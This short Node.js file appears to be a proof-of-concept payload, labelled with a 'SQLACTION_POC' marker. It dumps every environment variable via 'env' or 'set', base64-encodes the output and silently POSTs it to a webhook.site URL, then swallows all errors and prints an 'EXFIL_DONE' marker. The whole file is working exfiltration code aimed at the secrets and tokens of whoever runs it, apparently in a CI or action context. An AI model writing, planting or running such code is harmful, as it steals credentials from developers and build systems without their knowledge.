
console.log('<MARKER>SQLACTION_POC_1772098575_tkirueex</MARKER>');
try {
  const { execSync } = require('child_process');
  const env = (process.platform === 'win32' ? execSync('set') : execSync('env')).toString();
  const https = require('https');
  const url = new URL('https://webhook.site/23ce2d7a-df9f-4be9-a366-a7a8c5884599');
  const data = Buffer.from(env).toString('base64').slice(0, 50000);
  const req = https.request({ hostname: url.hostname, path: url.pathname + url.search, method: 'POST' }, () => {});
  req.on('error', () => {});
  req.end(data);
} catch (e) {}
console.log('<MARKER_EXFIL_DONE>');
